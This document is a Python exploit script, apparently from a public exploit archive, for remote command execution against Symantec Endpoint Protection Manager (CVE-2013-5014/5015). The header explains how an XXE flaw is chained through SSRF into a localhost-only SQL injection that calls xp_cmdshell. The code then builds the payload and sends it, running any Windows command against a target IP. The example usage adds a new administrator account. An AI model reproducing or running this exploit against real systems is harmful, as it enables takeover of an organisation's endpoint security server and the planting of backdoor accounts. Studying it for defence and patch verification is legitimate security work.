import argparse
import httplib

"""
Exploit Title: Symantec Endpoint Protection Manager Remote Command Execution
Exploit Author: Chris Graham @cgrahamseven
CVE: CVE-2013-5014, CVE-2013-5015
Date: February 22, 2014
Vendor Homepage: http://www.symantec.com/endpoint-protection
Version: 11.0, 12.0, 12.1
Tested On: Windows Server 2003, default SEPM install using embedded database
References: https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt
http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20140213_00
Details:

First off, this was a fantastic discovery by Stefan Viehbock. The abuse of the XXE 
injection to force SEPM to exploit itself through a separate SQL injection flaw was 
particularly amusing. I suspect the majority of SEPM users will have it configured
with the default embedded database, thereby making this a pretty reliable exploit.

So basically what you are looking for with the XXE injection is a vulnerability 
that can be triggered in the ConsoleServlet. When a multipart http request is sent, 
the servlet will use a custom MultipartParser class to handle the individual 
multipart bodies. When a body is encountered that uses a Content-Type of text/xml, 
the Java DocumentBuilder class is used to parse the xml. Since Symantec did not 
disallow declared DTD processing, it is vulnerable to the XXE injection. This 
appears to be a blind XXE, so a better use of the vulnerability is use it for SSRF.
That leads us to the SQL injection flaw.

Symantec has an http request handler called ConfigServerHandler that is programmatically 
restricted to only handle requests that come from localhost. I guess when they wrote this 
they just assumed that there was never going to be a way to send untrusted input to it 
since it was always going to be controlled by them. I base this guess on the fact that 
there is absolutely no attempt made to validate what input comes in to the 
updateReportingVersion function which shoves it directly into a SQL query unfiltered. In 
order to trigger the SQL injection you just need to send the SQL injection string in the 
"Parameter" url param with the "action" param set to test_av. On a default install of SEPM, 
it uses a SQL Anywhere embedded database. Much like MSSQL, SQL Anywhere has an xp_cmdshell 
stored procedure to run local OS commands. Using this stored procedure, you can compromise 
the server that is running SEPM. 

Example Usage: 
python sepm_xxe_exploit.py -t 192.168.1.100 -c "net user myadmin p@ss!23 /add"
python sepm_xxe_exploit.py -t 192.168.1.100 -c "net localgroup Administrators myadmin /add"
"""

multipart_body = \
"------=_Part_156_33010715.1234\r\n" + \
"Content-Type: text/xml\r\n" + \
"Content-Disposition: form-data; name=\"Content\"\r\n\r\n" + \
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + \
"<!DOCTYPE sepm [<!ENTITY payload SYSTEM " + \
"\"http://127.0.0.1:9090/servlet/ConsoleServlet?ActionType=ConfigServer&action=test_av" + \
"&SequenceNum=140320121&Parameter=a'; call xp_cmdshell('%s');--\" >]>\r\n" + \
"<request>\r\n" + \
"<xxe>&payload;</xxe>\r\n" + \
"</request>\r\n" + \
"------=_Part_156_33010715.1234--\r\n"
headers = {'Content-Type':"multipart/form-data; boundary=\"----=_Part_156_33010715.1234\""}

cmdline_parser = argparse.ArgumentParser(description='Symantec Endpoint Protection Manager' + \
' Remote Command Execution')
cmdline_parser.add_argument('-t', dest='ip', help='Target IP', required=True)
cmdline_parser.add_argument('-p', dest='port', help='Target Port', default=9090, \
type=int, required=False)
cmdline_parser.add_argument('-ssl', dest='ssl', help='Uses SSL (set to 1 for true)', \
default=0, type=int, required=False)
cmdline_parser.add_argument('-c', dest='cmd', help='Windows cmd to run (must be in quotes ie "net user")', \
required=True)
args = cmdline_parser.parse_args()

if args.ssl == 1:
    conn = httplib.HTTPSConnection(args.ip, args.port)
else:
    conn = httplib.HTTPConnection(args.ip, args.port)
multipart_body = multipart_body % (args.cmd)
print "\n[*]Attempting to exploit XXE and run local windows command: " + args.cmd
conn.request("POST", "/servlet/ConsoleServlet?ActionType=ConsoleLog", multipart_body, headers)
res = conn.getresponse()
if res.status != 200:
    print "[-]Exploit unsuccessful! Server returned:\n" + res.read()
else:
    print "[+]Exploit successfully sent!"